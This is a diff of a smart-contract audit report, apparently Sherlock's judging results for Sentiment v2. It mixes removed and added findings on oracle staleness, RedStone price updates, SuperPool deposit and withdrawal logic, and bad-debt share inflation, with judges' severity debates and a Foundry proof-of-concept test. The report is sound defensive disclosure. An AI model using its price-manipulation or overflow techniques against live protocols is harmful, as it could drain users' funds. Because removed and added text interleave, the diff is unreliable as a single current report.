-++          totalLiquidity += Math.min(POOL.getLiquidityOf(depositQueue[i]), POOL.getAssetsOf(depositQueue[i], address(this)));
-        }
-        totalLiquidity += ASSET.balanceOf(address(this)); // unallocated assets in the superpool
+**ruvaag**
 
-        // return the minimum of totalLiquidity and _owner balance
-        uint256 userAssets = _convertToAssets(ERC20.balanceOf(_owner), _totalAssets, _totalShares, Math.Rounding.Down);
-        return totalLiquidity > userAssets ? userAssets : totalLiquidity;
-    }
-```
+I think this should be a low because the intended behavior in the described case would be to use the worst stale price threshold which should mitigate this
 
-# Issue M-12: Incorrect check in validateBadDebt function 
+**0xspearmint1**
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/137 
+What do you mean by the worst stale price? @ruvaag 
+
+If you mean the smaller one, this will cause a serious DOS issue for the token with a larger threshold (liquidations will revert).
+
+If you mean the larger one, this will allow borrowing the other token at a stale price.
+
+The only mitigation is to have a seperate threshold for each token.
+
+**cvetanovv**
+
+I agree that the constant `STALE_PRICE_THRESHOLD` is not good to be hardcoded to 1 hour because each token pair has a different stale period when it needs to be updated. 
+
+Because of this, I agree that this issue is more of a Medium because the price may be outdated.
+
+I plan to accept the escalation and make this issue a Medium severity.
+
+**0xspearmint1**
+
+Hi @cvetanovv [#346](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/346) is **not** a duplicate of this issue, it is actually invalid.
+
+This issue is about using a constant `STALE_PRICE_THRESHOLD`
+
+[#346](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/346) describes a totally different attack vector which claims that the threshold is too short (threshold is set by the admin).
+
+**HHK-ETH**
+
+Agree, [346](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/346) is similar but incomplete. It only talks about the max duration threshold and not the constant itself. As it was correctly pointed out it could also be an issue to use a duration too small.
+
+It should be removed from duplicates 👍
+
+**cvetanovv**
+
+@0xspearmint1 @HHK-ETH Thanks for noting that #346 is not a duplicate of this issue. And it indeed uses a different attack vector.
+
+My decision is to accept the escalation and make this issue and its duplicates Medium severity without #346.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xspearmint1](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/126/#issuecomment-2355952938): accepted
+
+# Issue M-7: RedStone oracle is vulnerable because ```updatePrice``` is not called during the ```getEthValue``` function. 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/161 
 
 The protocol has acknowledged this issue.
 
 ## Found by 
-Smacaud, bareli, pseudoArtist
+ZeroTrust, phoenixv110, zarkk01
 ## Summary
-
-The validateBadDebt functions allows positions where assets equal debt to be classified as not in bad debt. This behavior affects the liquidateBadDebt function, which relies on this validation to determine whether a position should be liquidated.
+Redstone oracle doesn't work as expected returning outdated or user selected prices leading to every asset using it return wrong ETH values.
 
 ## Vulnerability Detail
+>[!NOTE]
+> **All** off-chain mechanisms of Sentiment protocol in the scope of this audit are stated in this section of [README](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/README.md?plain=1#L53-L56)
 
-The validateBadDebt function only reverts when totalAssetValue exceeds totalDebtValue depicting no bad debt
+As we can see in the ```RedstoneOracle``` contract the actual ```ethUsdPrice``` and ```assetUsdPrice``` are state variables which need to be updated every time the ```getValueInEth``` function be called so to calculate the real value of the asset in ETH. We can see the implementation here :
+```solidity
+function getValueInEth(address, uint256 amt) external view returns (uint256) {
+        if (priceTimestamp < block.timestamp - STALE_PRICE_THRESHOLD) revert RedstoneCoreOracle_StalePrice(ASSET);
 
-`  function validateBadDebt(address position) external view {
-       // ......Existing codes.....
-        if (totalAssetValue > totalDebtValue) revert RiskModule_NoBadDebt(position);
-    }`
+        // scale amt to 18 decimals
+        if (ASSET_DECIMALS <= 18) amt = amt * 10 ** (18 - ASSET_DECIMALS);
+        else amt = amt / 10 ** (ASSET_DECIMALS - 18);
 
-However, if totalAssetValue = totalDebtValue, the function does not revert and incorrectly considers the position as being in bad debt. 
-
-This can lead to case where totalAssetValue = totalDebtValue is being considered as bad debt which is technically not. The owner can go ahead to liquidate the position thinking its bad debt because of the incorrect check. 
+        // [ROUND] price is rounded down
+        return amt.mulDiv(assetUsdPrice, ethUsdPrice);
+    }
+```
+However, the ```updatePrice``` function is not called from anywhere, not even from inside the ```getValueInEth``` function which should seem logical.
 
 ## Impact
+Combined with the fact that the ```updatePrice``` function can be called by anyone "giving" the price 3 minutes of liveness, the impact/result of this vulnerability is someone to take advantage of a price which is not updated and get a wrong value of the asset in ETH, either lower or higher than the real one. For example, he can borrow with the wrong price and repay with the right price which is a bit higher, so return less amount that he took.
 
-The implementation could lead to unfair liquidations of positions that are technically not in bad debt (case of totalAssetValue = totalDebtValue )
 
 ## Code Snippet
+Here is the ```updatePrice``` of Redstone oracle : 
+```solidity
+    function updatePrice() external {
+        // values[0] -> price of ASSET/USD
+        // values[1] -> price of ETH/USD
+        // values are scaled to 8 decimals
+        uint256[] memory values = getOracleNumericValuesFromTxMsg(dataFeedIds);
 
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L126
+        assetUsdPrice = values[0];
+        ethUsdPrice = values[1];
 
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L447
+        // RedstoneDefaultLibs.sol enforces that prices are not older than 3 mins. since it is not
+        // possible to retrieve timestamps for individual prices being passed, we consider the worst
+        // case and assume both prices are 3 mins old
+        priceTimestamp = block.timestamp - THREE_MINUTES;
+    }
+```
+[Link to code](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/oracle/RedstoneOracle.sol#L48-L61)
 
 ## Tool used
-
 Manual Review
 
 ## Recommendation
+Consider calling ```updatePrice``` in the ```getEthValue``` function :
+```diff
+function getValueInEth(address, uint256 amt) external view returns (uint256) {
++       updatePrice();
+        // ...
+    }
+```
 
-Adjust the validateBadDebt function to handle the scenario where totalAssetValue is equal to totalDebtValue more accurately.
 
-# Issue M-13: `SuperPool` fails to correctly deposit into pools 
+
+## Discussion
+
+**z3s**
+
+Low/Info; this kind of functions are called regularly by a bot.
+
+**ZeroTrust01**
+
+Escalate
+judge：this kind of functions are called regularly by a bot.
+——There is no mention of this anywhere, Then, what is the time interval between the calls?
+This should be a valid issue. 
+
+**sherlock-admin3**
+
+> Escalate
+> judge：this kind of functions are called regularly by a bot.
+> ——There is no mention of this anywhere, Then, what is the time interval between the calls?
+> This should be a valid issue. 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+Тhis is a Low severity issue because `updatePrice()` is `external` and can be called before the price is taken. This way the price will not be outdated.
+
+Planning to reject the escalation and leave the issue as is.
+
+**ZeroTrust01**
+
+> Тhis is a Low severity issue because `updatePrice()` is `external` and can be called before the price is taken. This way the price will not be outdated.
+> 
+> Planning to reject the escalation and leave the issue as is.
+
+I cannot agree with this. My finding https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/310
+mentions how a malicious user could exploit this to manipulate the price.
+
+A borrower could call updatePrice() when the collateral price is high, but refrain from calling updatePrice() when the price is low, thereby maintaining an artificially inflated collateral value.
+
+This is a medium-level issue.
+
+
+**cvetanovv**
+
+> A borrower could call updatePrice() when the collateral price is high, but refrain from calling updatePrice() when the price is low, thereby maintaining an artificially inflated collateral value.
+
+This is a very rare edge case because the function will be called constantly by bots or other users. 
+
+The sponsor also confirmed that there would be bots calling the function.
+
+My decision to reject the escalation remains.
+
+**ZeroTrust01**
+
+> The sponsor also confirmed that there would be bots calling the function.
+
+I cannot agree with this.
+**According to Sherlock’s rules：**
+https://docs.sherlock.xyz/audits/judging/judging#ii.-criteria-for-issue-severity
+
+**the guidelines in the [README](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/README.md?plain=1#L53-L56), there are no bots calling the function updatePrice().** 
+### Q: Are there any off-chain mechanisms or off-chain procedures for the protocol (keeper bots, arbitrage bots, etc.)?
+Liquidator bots: maintain protocol solvency through timely liquidation of risky positions
+Reallocation bots: used to rebalance SuperPool deposits among respective base pools
+
+**The sponsor did not publicly disclose this information during the competition, so it cannot be used as a basis for the judge’s decision.**
+
+And there’s no need for any bots here; simply calling updatePrice() within the getValueInEth() function would suffice. 
+
+**cvetanovv**
+
+I think this issue could be Medium severity.
+
+Indeed, the protocol did not specify in the Readme that they would use such bots, so we can't take that into consideration.
+
+The other reason is that if the price satisfies a user and the real price is not to his advantage, he will not call the function.
+
+I am planning to accept the escalation and make this issue Medium.
+
+**Evert0x**
+
+Result:
+Medium
+Has Duplicates 
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [ZeroTrust01](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/161/#issuecomment-2351836126): accepted
+
+**ZeroTrust01**
+
+The issue #310 has not been added label (Medium Reward) @cvetanovv @Evert0x 
+Thanks 
+
+**cvetanovv**
+
+@ZeroTrust01 will be added at the end. As long as it is duplicated for a valid issue, then the system will not allow the results to come out before the label is added.
+
+# Issue M-8: `SuperPool` fails to correctly deposit into pools 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178 
 
 ## Found by 
-0xDazai, Atharv, Bigsam, KupiaSec, Yuriisereda
+0xDazai, Atharv, Bigsam, KupiaSec, Yuriisereda, dhank
 ## Summary
 
 When a depositor calls `SuperPool::deposit()` the internal `_deposit()` is called, it checks if `astTotalAssets + assets > superPoolCap` , transfers the assets from `msg.sender` to `superPool address` , mints `shares` to `receiver` and then calls `_supplyToPools()`. 
@@ -1557,972 +2055,425 @@ And in SuperPool.sol
     }
 ```
 
-# Issue M-14: Denial of Service (DoS) Vulnerability in SuperPool Withdrawal Due to Precision Loss (shares=0) in Pool Share Calculations when we call withdraw in pool contract. 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/179 
+
+## Discussion
+
+**S3v3ru5**
+
+Isn't that the intention of `SuperPool.poolCapFor[poolId]`?
+
+ The poolCapFor in the superpool is to do with the super pool itself: Max amount the super pool wants to deposit it into a certain pool. 
+
+pool.PoolCap is max amount of assets in the pool.
+
+The issue is clearly invalid. The issue is considering incorrect definition for state variable
+
+**NicolaMirchev**
+
+Escalate. 
+As per the above comment
+
+**sherlock-admin3**
+
+> Escalate. 
+> As per the above comment
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**0xDazaII**
+
+> Isn't that the intention of `SuperPool.poolCapFor[poolId]`?
+> 
+> The poolCapFor in the superpool is to do with the super pool itself: Max amount the super pool wants to deposit it into a certain pool.
+> 
+> pool.PoolCap is max amount of assets in the pool.
+> 
+> The issue is clearly invalid. The issue is considering incorrect definition for state variable
+
+Every BasePool has different settings which can incentivise users to or not to prefer to deposit into a BasePool ( e.g interest rate , rateModel and so on) . As its said in the docs ‘users who are accessing Sentiment UI has indirect interaction with base pools, Super Pools will take care of efficiently distributing user liquidity across multiple base pools for enhanced liquidity management. ‘ Having this in mind users who are using Sentiment UI fully rely on the correct functionality of the SuperPool contract. 
+
+Base Pools and SuperPools have a maximum poolCap set which shouldn’t be exceeded. Also BasePools can be used by multiple SuperPools or directly from their contract. These are the ways to deposit into a BasePool and eventually hit their cap depending of the cap value.
+
+The issue I am describing is that if SuperPool.poolCapForId is not reached in the ‘deposit’ function the ‘_supplyToPools()’ can call ‘POOL.deposit()’ with bigger value than it is available into the BasePool and the tx will revert because ‘_supplyToPools()’ is not checking how much exactly enough space does the BasePool has before hitting its cap and in case when the free space into the BasePool is smaller than the value which is tried to be deposited the tx will revert instead of depositing the amount which is available into that BasePool and the rest ,if there is any , to be deposited into the next BasePool from the SuperPool queue.
+
+**Tomiwasa0**
+
+I recommend  @S3v3ru5 to read the report well. With a basic understanding of the code, multiple Superpools, as explained by 0xDazall and others, can use the same pool. 
+The check should check the total deposited asset and compare with the cap not individual deposits with the cap
+
+**S3v3ru5**
+
+Sorry for misunderstanding. 
+
+So the issue is: The available free space in the base pool could be less than the supply amount and the `POOL.deposit` function might revert because of that. The `_supplyToPools()` function should try to deposit a max of available space in the base pool instead of the `min(supplyAmount, poolCapFor[poolId] - supplyAmount)`.
+
+
+**Tomiwasa0**
+
+The root cause is the most important thing that we should note. For better mitigations, you can check through other duplicates, sometimes the best report is not the best. But we practically are to deposit the minimum between the available space in the main pool (considering other pools) and the supply amount.
+
+**elhajin**
+
+From the readme :
+
+> Please discuss any design choices you made.
+
+> The deposit and withdraw flows in the SuperPool sequentially deposit and withdraw from pools. This can be inefficient at times. We assume that the SuperPool owner will use the reallocate function to rebalance liquidity among pools.
+
+**Tomiwasa0**
+
+Thanks for the input @elhajin, kindly look through the code implementation. The same check flaw exists in the rebalance function. It was indeed an oversight that has been confirmed and will be fixed. We can't risk having an inefficient deposit, withdrawal and rebalance function, can we? Also, Feel free to read other duplicates also.
+
+**cvetanovv**
+
+Looks like we have an issue here and the deposit function is not working as it should.
+
+@ruvaag what do you think?
+
+**dhankx7**
+
+Please reconsider the issue #[602](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/602).
+
+It clearly states the similar issue and should be grouped with this bug.
+
+**ruvaag**
+
+I think this is valid. The Base Pool cap should be taken into account.
+
+the intended behavior is to deposit as much as possible in the pools, and this helps with that.
+
+**cvetanovv**
+
+The sponsor confirms that we have a issue here. 
+
+The issue is valid because the Base Pool cap should be considered when calculating the available deposit space in the pool. 
+
+I will also duplicate #602 to this issue.
+
+Planning to reject the escalation and leave the issue as is. I will duplicate #602 to this issue.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [EgisSecurity](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178/#issuecomment-2354923813): rejected
+
+# Issue M-9: Super Pool shares can be inflated by bad debt leading to overflows 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/266 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
-Bigsam
+h2134
 ## Summary
-
-The SuperPool contract contains a vulnerability that can cause a Denial of Service (DoS) for users attempting to withdraw their funds. Although the SuperPool may have enough liquidity, precision loss in pool share calculations can lead to failed withdrawals, preventing users from accessing their funds.
+Super Pool shares can be inflated by bad debt leading to overflows.
 
 ## Vulnerability Detail
-When a user attempts to withdraw funds from the SuperPool, the `_withdrawFromPools` function loops through the various pools to gather the required assets. The function calls the `withdraw` function in each pool contract, which calculates the deposit shares to burn. Due to precision loss, the calculation may result in zero shares to burn, causing the withdrawal to revert. This issue occurs even when the pool has sufficient liquidity to cover the transaction, leading to a failed withdrawal despite the availability of funds.
-
+Super Pool shares are calculated based on total assets and total supply, i.e $Shares = Deposit Amount * Total Shares / Total Assets$.
+[SuperPool.sol#L194-L197](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L194-L197):
 ```solidity
- 
-    function _withdraw(address receiver, address owner, uint256 assets, uint256 shares) internal {
-
-@audit>> calll >>        _withdrawFromPools(assets);
-    
-    if (msg.sender != owner) ERC20._spendAllowance(owner, msg.sender,
+    function convertToShares(uint256 assets) public view virtual returns (uint256 shares) {
+        (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
+        return _convertToShares(assets, newTotalAssets, totalSupply() + feeShares, Math.Rounding.Down);
+    }
 ```
+At the beginning, when user deposits $1000e18$ asset tokens, they can mint $1000e18$ shares. The assets will be deposited into underlying pools and normally `Shares per Token` is expected to be deflated as interest accrues. 
+
+However, if the borrowed assets are not repaid, bad debt may occur and it can be liquidated by pool owner. As a result, `Total Assets` owned by the Super Pool will be largely reduced, as a result, `Shares per Token` can be heavily inflated to a very large value, eventually leading to overflows if bad debt liquidated for several times.
+
+Consider the following scenario in PoC:
+1. Initially in Super Pool `Total Assets` is $1000$ and `Total Shares` is $1000$, `Shares per Token` is $1$;
+2. Depositor mints $1000e18$ shares by depositing $1000e18$ asset tokens, the assets is deposited into underlying pool;
+3. Borrower borrows $1000e18$ asset tokens from underlying pool, somehow the borrower is unable to repay and due to price fluctuation, bad debt occurs and is liquidated by the owner;
+4. At the point, Super Pool's `Total Assets` is $1000$ and `Total Shares` is $1000000000000000001000$, `Shares per Token` is inflated to $999000999000999001999000999000999000$;
+5. As more asset tokens may be deposited into underlying pool through Super Pool, similar bad debt may occur again and `Shares per Token` will be further inflated. 
+
+In the case of PoC, `Shares per Token` can be inflated to be more than `uint256.max`(around $1e78$) after just **4** bad debt liquidations:
+| | Total Assets | Total Shares  | Shares per Token  |
+| :------ | :------------| :-------------| :------------------|
+| 1 | 1000 | 1000000000000000001000 | 999000999000999001999000999000999000 |
+| 2 | 1000| 999000999000999002999000999000999001999 | 998002996004994008990010988012986015984015984015984015 |
+| 3 | 1000| 998002996004994009989011987013985018983016983016983017983 | 997005990014979030958053933080904114868148834182800217766233766233766233 |
+| 4 | 1000| 997005990014979031956056929085898124857160821196785236749250749250749251749 | **OverFlow** |
+
+Please run the PoC in **BigTest.t.sol**:
 ```solidity
+    function testAudit_Overflows() public {
+        // Pool Asset
+        MockERC20 poolAsset = new MockERC20("Pool Asset", "PA", 18);
+        // Collateral Asset
+        MockERC20 collateralAsset = new MockERC20("Collateral Asset", "CA", 18);
 
-    function _withdrawFromPools(uint256 assets) internal {
-        uint256 assetsInSuperpool = ASSET.balanceOf(address(this));
+        vm.startPrank(protocolOwner);
+        positionManager.toggleKnownAsset(address(poolAsset));
+        positionManager.toggleKnownAsset(address(collateralAsset));
+        riskEngine.setOracle(address(poolAsset), address(new FixedPriceOracle(1e18)));
+        riskEngine.setOracle(address(collateralAsset), address(new FixedPriceOracle(1e18)));
+        vm.stopPrank();
 
-        if (assetsInSuperpool >= assets) return;
-        else assets -= assetsInSuperpool;
+        // Create Underlying Pool
+        address poolOwner = makeAddr("PoolOwner");
 
+        vm.startPrank(poolOwner);
+        bytes32 FIXED_RATE_MODEL_KEY = 0xeba2c14de8b8ca05a15d7673453a0a3b315f122f56770b8bb643dc4bfbcf326b;
+        uint256 poolId = pool.initializePool(poolOwner, address(poolAsset), type(uint128).max, FIXED_RATE_MODEL_KEY);
+        riskEngine.requestLtvUpdate(poolId, address(collateralAsset), 0.8e18);
+        riskEngine.acceptLtvUpdate(poolId, address(collateralAsset));
+        vm.stopPrank();
 
-// loop through  
- uint256 withdrawQueueLength = withdrawQueue.length;
-        for (uint256 i; i < withdrawQueueLength; ++i) {
+        // Create Super Pool
+        address superPoolOwner = makeAddr("SuperPoolOwner");
+        poolAsset.mint(superPoolOwner, 1000);
 
+        vm.startPrank(superPoolOwner);
+        poolAsset.approve(address(superPoolFactory), 1000);
+        address superPoolAddress = superPoolFactory.deploySuperPool(
+            superPoolOwner, // owner
+            address(poolAsset), // asset
+            superPoolOwner, // feeRecipient
+            0, // fee
+            10000e18, // superPoolCap
+            1000, // initialDepositAmt
+            "SuperPool", // name
+            "SP" // symbol
+        );
+        vm.stopPrank();
 
-   @audit>> as long as amount is greater than 0 even if this is 1 wei >>    if (withdrawAmt > 0) {
-           
-                                                             try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {
+        SuperPool superPool = SuperPool(superPoolAddress);
 
-   @audit>> reduce asset for the next withdrawal>>                 assets -= withdrawAmt;
-              
-  } catch { }
-            }
+        // add pool
+        vm.prank(superPoolOwner);
+        superPool.addPool(poolId, 1000e18);
 
-            if (assets == 0) return;
+        address alice = makeAddr("Alice");
+        address bob = makeAddr("Bob");
+
+        (address payable position, Action memory newPos) = newPosition(bob, "Borrower");
+        positionManager.process(position, newPos);
+
+        for (uint i; i < 3; ++i) {
+            inflatedSharesByBadDebt(alice, bob, position, poolId, superPool, poolAsset, collateralAsset);
         }
 
-```
-The vulnerability arises because the `withdraw` function in the pool contract uses the following logic:
+        inflatedSharesByBadDebt(alice, bob, position, poolId, superPool, poolAsset, collateralAsset);
+        superPool.accrue();
 
+        // Super Pool operations are blocked
+        vm.expectRevert("Math: mulDiv overflow");
+        superPool.previewDeposit(1e18);
 
-```solidity
+        vm.expectRevert("Math: mulDiv overflow");
+        superPool.previewWithdraw(1e18);
+    }
 
+    function inflatedSharesByBadDebt(
+        address depositor, 
+        address borrower,
+        address position,
+        uint256 poolId, 
+        SuperPool superPool,
+        MockERC20 poolAsset, 
+        MockERC20 collateralAsset
+    ) private {
+        vm.startPrank(protocolOwner);
+        riskEngine.setOracle(address(collateralAsset), address(new FixedPriceOracle(1e18)));
+        vm.stopPrank();
 
-    @audit>> if 1 wei or less enough shares = 0 >>       shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Up);
- 
-// check for rounding error since convertToShares
- 
-   @audit>> Revert >>  if (shares == 0) revert Pool_ZeroShareRedeem(poolId, assets);
-```
+        uint256 assetAmount = 1000e18;
+        uint256 collateralAmount = assetAmount * 10 / 8;
 
+        // Depositor deposits
+        poolAsset.mint(depositor, assetAmount);
 
-NOTE -  OpenZeppelin  Math.sol round up only when the multiplication of the numerators are greater than 1 else 0 is still returned.
+        vm.startPrank(depositor);
+        poolAsset.approve(address(superPool), assetAmount);
+        superPool.deposit(assetAmount, depositor);
+        vm.stopPrank();
 
-```solidity
-  /**
-     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
-     */
-    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
-        uint256 result = mulDiv(x, y, denominator);
-  
- @AUDIT>>     if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
+        // Borrower borrows from Underlying Pool
+        collateralAsset.mint(borrower, collateralAmount);
+
+        Action memory addNewCollateral = addToken(address(collateralAsset));
+        Action memory depositCollateral = deposit(address(collateralAsset), collateralAmount);
+        Action memory borrowAct = borrow(poolId, assetAmount);
+
+        Action[] memory actions = new Action[](3);
+        actions[0] = addNewCollateral;
+        actions[1] = depositCollateral;
+        actions[2] = borrowAct;
     
-                   result += 1;
-        }
-        return result;
+        vm.startPrank(borrower);
+        collateralAsset.approve(address(positionManager), type(uint256).max);
+        positionManager.processBatch(position, actions);
+        vm.stopPrank();
+
+        // Collateral price dumps and Borrower's position is in bad debt
+        vm.startPrank(protocolOwner);
+        riskEngine.setOracle(address(collateralAsset), address(new FixedPriceOracle(0.8e18)));
+        vm.stopPrank();
+
+        // Owner liquiates bad debt
+        vm.prank(protocolOwner);
+        positionManager.liquidateBadDebt(position);
     }
 ```
 
-If the calculated `shares` is zero due to precision loss, the function reverts, causing the entire withdrawal process in the SuperPool to fail.
-
-
-
 ## Impact
-The inability to withdraw from the SuperPool, even when sufficient liquidity exists, can cause significant disruption for users. This DoS vulnerability can prevent users from accessing their funds.  
-
-**FLOW** 
-
- Super pool A has 3 pools 1, 2 and 3.
-
-Liquidity in each pool
-
-                                               Superpool holds asset -- 30e18
-
-assets + interest
-
-                                               Pool 1 -  18.573457857309736565e18
-
-                                               Pool 2 - 1.426542142690263434e18
-
-                                               Pool 3 - 10e18
-
-Total available asset in the pool -  59.999999999999999999e18.
-
-User calls to withdraw - 50e18 of their asset in superppool.
-
-
-We loop through each  Process- 
-
-                           1. assets -= assetsInSuperpool;
-
-assets = 20e18.
-
-                              2.  assets -= withdrawAmt;
-
-assets =1.426542142690263435e18
-
-                              3.  assets -= withdrawAmt;
- 
-assets = 1
-
-
-
-```solidity
-  if (withdrawAmt > 0) {
-
-      try POOL.withdraw(poolId, withdrawAmt, address(this), address(this))
-```
-
- we attempt to withdraw this 1 wei.
-
-
-
-                            **### _Pool 3._** 
-
-```solidity
-
- function withdraw(
-        uint256 poolId,
-        uint256 assets,
-        address receiver,
-        address owner
-    ) public returns (uint256 shares) {
-        PoolData storage pool = poolDataFor[poolId];
-
-        // update state to accrue interest since the last time accrue() was called
-        accrue(pool, poolId);
-
-        shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Up);
-        // check for rounding error since convertToShares rounds down
-        if (shares == 0) revert Pool_ZeroShareRedeem(poolId, assets);
--------------------------------------------------------------------------------------------
-
-```
-
-
-
-                         pool.totalDepositAssets = 18.9e18 ,
-
-                         pool.totalDepositShares = 18.2e18 ,
-
-                         assets= 1 wei.
-
-                         Convert to shares = (1 * 18.2 e18)/ 18.9 e18 =  0.96296296296296296296296296296296= 0.
-
-                         OpenZeppelin  Math.sol will not round to 1 because the answer is not greater than 0. thus this will revert.
-
-
-
-**Also note** an attacker can also play with the asset in the Superpool by depositing dust amounts to ensure that the amount in the pool remains 1 wei at a point when we make external calls and cause a reversion. This is possible because we use address this to check the amount in the Superpool contract. 
+Shares are inflated by bad debts, the more volatile an asset is, the more likely bad debt occurs. Small bad debt may not be a problem because they can only inflate shares by a little bit, however, a few large bad debts as showed in PoC can cause irreparable harm to the protocol (it is especially so if the asset token has higher decimals), and shares are very likely be inflated to overflow in the long run. 
+As a result, most of the operations can be blocked, users cannot deposit or withdraw. 
 
 ## Code Snippet
-
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L569-L573
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350-L352
-
-https://github.com/OpenZeppelin/openzeppelin-contracts/blob/dc44c9f1a4c3b10af99492eed84f83ed244203f6/contracts/utils/math/Math.sol#L139-L145
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L456-L472
 
 ## Tool used
-
 Manual Review
 
 ## Recommendation
-
-To mitigate this issue, modify the catch block in the `_withdrawFromPools` function to check if the pool liquidity is greater than the amount to be collected. If so, collect the pool liquidity and transfer it to the user from the contract. This change ensures that even if precision loss occurs, the user can still withdraw the available liquidity. Here is the recommended modification:
-
-
-```solidity
-
-  // withdrawAmt cannot be greater than the underlying pool liquidity
-            uint256 poolLiquidity = POOL.getLiquidityOf(poolId);
-            if (poolLiquidity < withdrawAmt) withdrawAmt = poolLiquidity;
-
-            if (withdrawAmt > 0) {
-                try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {
-                    assets -= withdrawAmt;
-                } catch {
-++    if (poolLiquidity > withdrawAmt) {
-++         withdrawAmt = poolLiquidity;
-++    POOL.withdraw(poolId, withdrawAmt, address(this), address(this));
-++    assets = 0;}
-
- }
-            }
-```
-This adjustment will allow withdrawals to succeed even when precision loss leads to zero shares being calculated, thus preventing the DoS vulnerability.
-
---- 
-
-# Issue M-15: Incorrect Calculation of `_minRequestedValue` Exposes Healthy Positions to Liquidation and Prevents Full Borrowing/Withdrawal 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/184 
-
-## Found by 
-A2-security
-## Summary
-The `_getMinReqAssetValue` function incorrectly calculates the minimum required asset value, leading to an overestimation of `minReqAssetValue`.
-
-## Vulnerability Detail
-- The protocol allows positions to use  multiple type of tokens (up to 5) as collateral. each collateral/pool have different **LTV** which is a percentage of the collateral value that can be borrowed.
-- after each action done by a position we should check that the position is  healthy which is crucial check. 
-- for a positon to be healthy we should check that the `minReqAssetValue` is less then the collateral value of that position.
-
-```solidity
-    function isPositionHealthy(address position) public view returns (bool) {
-        // some code ... 
-   >>   uint256 minReqAssetValue = _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
-   >>   return totalAssetValue >= minReqAssetValue;
-    }
-```
-```js
-
-    function _getMinReqAssetValue(
-        uint256[] memory debtPools,
-        uint256[] memory debtValuleForPool,
-        address[] memory positionAssets,
-        uint256[] memory wt,
-        address position
-    ) internal view returns (uint256) {
-        uint256 minReqAssetValue;
-
-        // O(pools.len * positionAssets.len)
-        uint256 debtPoolsLength = debtPools.length;
-        uint256 positionAssetsLength = positionAssets.length;
-        for (uint256 i; i < debtPoolsLength; ++i) {
-            for (uint256 j; j < positionAssetsLength; ++j) {
-                uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);
-
-                // revert with pool id and the asset that is not supported by the pool
-                if (ltv == 0) revert RiskModule_UnsupportedAsset(position, debtPools[i], positionAssets[j]);
-
-                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
-            }
-        }
-    }
-```
-- To compute the `minReqAssetValue` for a debt to be healthy. If we convert the function into its mathematical representation. It will be the equivalent to this (we are simplifing it by only taking the formula for a single debt pool)
-Let:
-- $DV = \text{debtValuleForPool}[0]$
-
-- $DP = \text{debtPools}[0]$
-
-- $\text{PAL} = \text{length of } \text{positionAssets}$
-
-- $\text{positionAssets}[j] = PA_j$
-
-- $wt[j] = w_j$
-
-- $\text{ltvFor}(DP, PA_j) = ltv_j$
-
-- $\text{minReqAssetValue} = \text{MAV}$
-
-- $\lceil x \rceil$ denotes the ceiling function, rounding $x$ up to the nearest integer.
-
-The function calculates $\text{MAV}$ as follows:
-
-$$
-\text{MAV} = \sum_{j=0}^{\text{PAL}-1} \left( \left\lceil \frac{DV \cdot w_j}{ltv_j} \right\rceil \right)
-$$
-
-1. First equation (how the code is currently implemented) could be simplified to this:
-```math
-   $$
-   \text{MAV} = DV \times {\sum_{j=0}^{n} \frac{w_j}  {\text{ltv}_j}}
-   $$
-```
-2. The above expression is not equal to the total value divided by the weighted average ltv (how it should be calculated):
-```math
-   $$
